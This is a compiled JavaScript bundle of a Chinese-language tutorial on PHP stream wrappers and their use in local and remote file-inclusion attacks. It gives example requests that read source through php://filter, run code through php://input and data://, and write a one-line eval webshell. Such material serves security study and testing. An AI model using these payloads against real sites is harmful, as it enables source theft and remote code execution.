(window.webpackJsonp=window.webpackJsonp||[]).push([[46],{371:function(t,e,_){"use strict";_.r(e);var v=_(3),a=Object(v.a)({},(function(){var t=this,e=t._self._c;return e("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[e("p",[t._v("[toc]")]),t._v(" "),e("h1",{attrs:{id:"php伪协议"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#php伪协议"}},[t._v("#")]),t._v(" php伪协议")]),t._v(" "),e("h2",{attrs:{id:"php支持的伪协议"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#php支持的伪协议"}},[t._v("#")]),t._v(" php支持的伪协议")]),t._v(" "),e("blockquote",[e("ol",[e("li",[e("code",[t._v("file:// — 访问本地文件系统")])]),t._v(" "),e("li",[e("code",[t._v("http:// — 访问 HTTP(s) 网址")])]),t._v(" "),e("li",[e("code",[t._v("ftp:// — 访问 FTP(s) URLs")])]),t._v(" "),e("li",[e("code",[t._v("php:// — 访问各个输入/输出流（I/O streams）")])]),t._v(" "),e("li",[e("code",[t._v("zlib:// — 压缩流")])]),t._v(" "),e("li",[e("code",[t._v("data:// — 数据（RFC 2397）")])]),t._v(" "),e("li",[e("code",[t._v("glob:// — 查找匹配的文件路径模式")])]),t._v(" "),e("li",[e("code",[t._v("phar:// — PHP 归档")])]),t._v(" "),e("li",[e("code",[t._v("ssh2:// — Secure Shell 2")])]),t._v(" "),e("li",[e("code",[t._v("rar:// — RAR")])]),t._v(" "),e("li",[e("code",[t._v("ogg:// — 音频流")])]),t._v(" "),e("li",[e("code",[t._v("expect:// — 处理交互式的流")])])])]),t._v(" "),e("h2",{attrs:{id:"pip-ini参数设置"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#pip-ini参数设置"}},[t._v("#")]),t._v(" pip.ini参数设置")]),t._v(" "),e("blockquote",[e("p",[t._v("在php.ini里有两个重要的参数allow_url_fopen、allow_url_include。")]),t._v(" "),e("p",[t._v("allow_url_fopen:默认值是ON。允许url里的封装协议访问文件；")]),t._v(" "),e("p",[t._v("allow_url_include:默认值是OFF。不允许包含url里的封装协议包含文件；")])]),t._v(" "),e("h2",{attrs:{id:"各协议的利用条件和方法"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#各协议的利用条件和方法"}},[t._v("#")]),t._v(" 各协议的利用条件和方法")]),t._v(" "),e("p",[e("img",{attrs:{src:"https://cdn.jsdelivr.net/gh/Riam-jimmy/picture/image-20221015194228502.png",alt:"image-20221015194228502"}})]),t._v(" "),e("h3",{attrs:{id:"php-input"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#php-input"}},[t._v("#")]),t._v(" php://input")]),t._v(" "),e("blockquote",[e("p",[t._v("php://input可以访问请求的原始数据的只读流，将post请求的数据当作php代码执行。当传入的参数作为文件名打开时，可以将参数设为php://input,同时post想设置的文件内容，php执行时会将post内容当作文件内容。")])]),t._v(" "),e("p",[e("strong",[t._v("注：当enctype=”multipart/form-data”时，php://input是无效的。")])]),t._v(" "),e("h3",{attrs:{id:"file"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#file"}},[t._v("#")]),t._v(" file://")]),t._v(" "),e("blockquote",[e("p",[t._v("用于访问本地文件系统。当指定了一个相对路径（不以/、、\\或 Windows 盘符开头的路径）提供的路径将基于当前的工作目录。")])]),t._v(" "),e("p",[e("em",[t._v("用法:")])]),t._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[t._v("1、file://[文件的绝对路径和文件名]\nhttp://127.0.0.1/include.php?file=file://E:\\phpStudy\\PHPTutorial\\WWW\\phpinfo.txt\n2、[文件的相对路径和文件名]\nhttp://127.0.0.1/include.php?file=./phpinfo.txt\n")])]),t._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[t._v("1")]),e("br"),e("span",{staticClass:"line-number"},[t._v("2")]),e("br"),e("span",{staticClass:"line-number"},[t._v("3")]),e("br"),e("span",{staticClass:"line-number"},[t._v("4")]),e("br")])]),e("h3",{attrs:{id:"http-、https"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#http-、https"}},[t._v("#")]),t._v(" http://、https://")]),t._v(" "),e("blockquote",[e("p",[t._v("URL 形式，允许通过 HTTP 1.0 的 GET方法，以只读访问文件或资源，通常用于远程包含。")])]),t._v(" "),e("p",[e("em",[t._v("用法：")])]),t._v(" "),e("p",[e("code",[t._v("[http：//网络路径和文件名]http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt")])]),t._v(" "),e("h3",{attrs:{id:"php"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#php"}},[t._v("#")]),t._v(" php://")]),t._v(" "),e("blockquote",[e("p",[t._v("php:// 用于访问各个输入/输出流（I/O streams），经常使用的是php://filter和php://input，php://filter用于读取源码，php://input用于执行php代码。")])]),t._v(" "),e("table",[e("thead",[e("tr",[e("th",[t._v("协议")]),t._v(" "),e("th",[t._v("作用")])])]),t._v(" "),e("tbody",[e("tr",[e("td",[t._v("php://input")]),t._v(" "),e("td",[t._v('可以访问请求的原始数据的只读流，在POST请求中访问POST的data部分，在enctype="multipart/form-data" 的时候php://input 是无效的。')])]),t._v(" "),e("tr",[e("td",[t._v("php://output")]),t._v(" "),e("td",[t._v("只写的数据流，允许以 print 和 echo 一样的方式写入到输出缓冲区。")])]),t._v(" "),e("tr",[e("td",[t._v("php://fd")]),t._v(" "),e("td",[t._v("(>=5.3.6)允许直接访问指定的文件描述符。例如 "),e("code",[t._v("php://fd/3")]),t._v(" 引用了文件描述符 3。")])]),t._v(" "),e("tr",[e("td",[t._v("php://memory php://temp")]),t._v(" "),e("td",[t._v("(>=5.1.0)一个类似文件包装器的数据流，允许读写临时数据。两者的唯一区别是 "),e("code",[t._v("php://memory")]),t._v(" 总是把数据储存在内存中，而 "),e("code",[t._v("php://temp")]),t._v(" 会在内存量达到预定义的限制后（默认是 "),e("code",[t._v("2MB")]),t._v("）存入临时文件中。临时文件位置的决定和 "),e("code",[t._v("sys_get_temp_dir()")]),t._v(" 的方式一致。")])]),t._v(" "),e("tr",[e("td",[t._v("php://filter")]),t._v(" "),e("td",[t._v("(>=5.0.0)一种元封装器，设计用于数据流打开时的筛选过滤应用。对于一体式"),e("code",[t._v("（all-in-one）")]),t._v("的文件函数非常有用，类似 "),e("code",[t._v("readfile()")]),t._v("、"),e("code",[t._v("file()")]),t._v(" 和 "),e("code",[t._v("file_get_contents()")]),t._v("，在数据流内容读取之前没有机会应用其他过滤器。")])])])]),t._v(" "),e("h4",{attrs:{id:"php-filter参数详解"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#php-filter参数详解"}},[t._v("#")]),t._v(" php://filter参数详解")]),t._v(" "),e("table",[e("thead",[e("tr",[e("th",[t._v("参数")]),t._v(" "),e("th",[t._v("描述")])])]),t._v(" "),e("tbody",[e("tr",[e("td",[t._v("resource=<要过滤的数据流>")]),t._v(" "),e("td",[t._v("必须项。它指定了你要筛选过滤的数据流。")])]),t._v(" "),e("tr",[e("td",[t._v("read=<读链的过滤器>")]),t._v(" "),e("td",[t._v("该参数可选。可以设定一个或多个过滤器名称，以管道符(|)分隔")])]),t._v(" "),e("tr",[e("td",[e("em",[t._v("write=<写链的筛选列表>")])]),t._v(" "),e("td",[t._v("该参数可选。可以设定一个或多个过滤器名称，以管道符(|)分隔")])]),t._v(" "),e("tr",[e("td",[t._v("<; 两个链的过滤器>")]),t._v(" "),e("td",[t._v("任何没有以 "),e("em",[t._v("read=")]),t._v(" 或 "),e("em",[t._v("write=")]),t._v(" 作前缀的筛选器列表会视情况应用于读或写链。")])])])]),t._v(" "),e("h5",{attrs:{id:"可用的过滤器列表-4类"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#可用的过滤器列表-4类"}},[t._v("#")]),t._v(" 可用的过滤器列表(4类)")]),t._v(" "),e("table",[e("thead",[e("tr",[e("th",[t._v("字符串过滤器")]),t._v(" "),e("th",[t._v("作用")])])]),t._v(" "),e("tbody",[e("tr",[e("td",[t._v("string.rot13")]),t._v(" "),e("td",[t._v("等同于"),e("code",[t._v("str_rot13()")]),t._v("，rot13变换")])]),t._v(" "),e("tr",[e("td",[t._v("string.toupper")]),t._v(" "),e("td",[t._v("等同于"),e("code",[t._v("strtoupper()")]),t._v("，转大写字母")])]),t._v(" "),e("tr",[e("td",[t._v("string.tolower")]),t._v(" "),e("td",[t._v("等同于"),e("code",[t._v("strtolower()")]),t._v("，转小写字母")])]),t._v(" "),e("tr",[e("td",[t._v("string.strip_tags")]),t._v(" "),e("td",[t._v("等同于"),e("code",[t._v("strip_tags()")]),t._v("，去除html、PHP语言标签")])])])]),t._v(" "),e("table",[e("thead",[e("tr",[e("th",[e("strong",[t._v("转换过滤器")])]),t._v(" "),e("th",[e("strong",[t._v("作用")])])])]),t._v(" "),e("tbody",[e("tr",[e("td",[t._v("convert.base64-encode & convert.base64-decode")]),t._v(" "),e("td",[t._v("等同于"),e("code",[t._v("base64_encode()")]),t._v("和"),e("code",[t._v("base64_decode()")]),t._v("，base64编码解码")])]),t._v(" "),e("tr",[e("td",[t._v("convert.quoted-printable-encode & convert.quoted-printable-decode")]),t._v(" "),e("td",[t._v("quoted-printable 字符串与 8-bit 字符串编码解码")])])])]),t._v(" "),e("table",[e("thead",[e("tr",[e("th",[e("strong",[t._v("压缩过滤器")])]),t._v(" "),e("th",[e("strong",[t._v("作用")])])])]),t._v(" "),e("tbody",[e("tr",[e("td",[t._v("zlib.deflate & zlib.inflate")]),t._v(" "),e("td",[t._v("在本地文件系统中创建 gzip 兼容文件的方法，但不产生命令行工具如 gzip的头和尾信息。只是压缩和解压数据流中的有效载荷部分。")])]),t._v(" "),e("tr",[e("td",[t._v("bzip2.compress & bzip2.decompress")]),t._v(" "),e("td",[t._v("同上，在本地文件系统中创建 bz2 兼容文件的方法。")])])])]),t._v(" "),e("table",[e("thead",[e("tr",[e("th",[e("strong",[t._v("加密过滤器")])]),t._v(" "),e("th",[e("strong",[t._v("作用")])])])]),t._v(" "),e("tbody",[e("tr",[e("td",[t._v("mcrypt.*")]),t._v(" "),e("td",[t._v("libmcrypt 对称加密算法")])]),t._v(" "),e("tr",[e("td",[t._v("mdecrypt.*")]),t._v(" "),e("td",[t._v("libmcrypt 对称解密算法")])])])]),t._v(" "),e("h5",{attrs:{id:"读取文件源码用法"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#读取文件源码用法"}},[t._v("#")]),t._v(" 读取文件源码用法")]),t._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[t._v("php://filter/read=convert.base64-encode/resource=[文件名]\n")])]),t._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[t._v("1")]),e("br")])]),e("p",[t._v("例如:")]),t._v(" "),e("p",[e("code",[t._v("http://127.0.0.1/include.php?file=php://filter/read=convert.base64-encode/resource=phpinfo.php")])]),t._v(" "),e("h5",{attrs:{id:"执行php代码用法"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#执行php代码用法"}},[t._v("#")]),t._v(" 执行php代码用法")]),t._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[t._v("php://input + [POST DATA]\n")])]),t._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[t._v("1")]),e("br")])]),e("p",[t._v("例如:")]),t._v(" "),e("p",[e("code",[t._v("http://127.0.0.1/include.php?file=php://input")])]),t._v(" "),e("p",[t._v("[POST DATA部分]")]),t._v(" "),e("p",[e("code",[t._v("<?php phpinfo(); ?>")])]),t._v(" "),e("h5",{attrs:{id:"写入一句话木马用法"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#写入一句话木马用法"}},[t._v("#")]),t._v(" 写入一句话木马用法")]),t._v(" "),e("ol",[e("li",[e("code",[t._v("http://127.0.0.1/include.php?file=php://input")])]),t._v(" "),e("li",[t._v("[POST DATA部分]")]),t._v(" "),e("li",[e("code",[t._v("<?php fputs(fopen('shell.php','w'),'<?php @eval($_GET[cmd]); ?>'); ?>")])])]),t._v(" "),e("h3",{attrs:{id:"phar-、zip-、bzip2-、zlib"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#phar-、zip-、bzip2-、zlib"}},[t._v("#")]),t._v(" phar://、zip://、bzip2://、zlib://")]),t._v(" "),e("p",[t._v("用于读取压缩文件，"),e("code",[t._v("zip://")]),t._v(" 、 "),e("code",[t._v("bzip2://")]),t._v(" 、 "),e("code",[t._v("zlib://")]),t._v(" 均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名，可修改为任意后缀："),e("code",[t._v("jpg")]),t._v(" "),e("code",[t._v("png")]),t._v(" "),e("code",[t._v("gif")]),t._v(" "),e("code",[t._v("xxx")]),t._v(" 等等。")]),t._v(" "),e("h4",{attrs:{id:"用法示例"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#用法示例"}},[t._v("#")]),t._v(" 用法示例")]),t._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[t._v("phar://http://127.0.0.1/include.php?file=phar://E:/phpStudy/PHPTutorial/WWW/phpinfo.zip/phpinfo.txt\n")])]),t._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[t._v("1")]),e("br")])]),e("h3",{attrs:{id:"data"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#data"}},[t._v("#")]),t._v(" data://")]),t._v(" "),e("p",[t._v("数据流封装器，以传递相应格式的数据。通常可以用来执行PHP代码。")]),t._v(" "),e("h4",{attrs:{id:"示例用法"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#示例用法"}},[t._v("#")]),t._v(" 示例用法")]),t._v(" "),e("div",{staticClass:"language- line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-text"}},[e("code",[t._v("1、data://text/plain,\nhttp://127.0.0.1/include.php?file=data://text/plain,<?php%20phpinfo();?>\n2、data://text/plain;base64,\nhttp://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b\n")])]),t._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[t._v("1")]),e("br"),e("span",{staticClass:"line-number"},[t._v("2")]),e("br"),e("span",{staticClass:"line-number"},[t._v("3")]),e("br"),e("span",{staticClass:"line-number"},[t._v("4")]),e("br")])])])}),[],!1,null,null,null);e.default=a.exports}}]);